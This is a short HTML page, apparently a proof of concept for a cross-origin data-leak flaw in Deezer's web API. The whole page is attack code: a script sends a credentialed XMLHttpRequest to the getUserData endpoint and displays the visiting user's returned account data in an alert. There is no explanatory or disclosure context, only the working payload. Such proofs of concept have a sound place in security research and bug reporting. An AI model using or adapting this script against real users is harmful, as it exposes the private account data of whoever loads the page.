<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.deezer.com/ajax/gw-light.php?method=deezer.getUserData&input=3&api_version=1.0&api_token=&cid=jkjk',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>
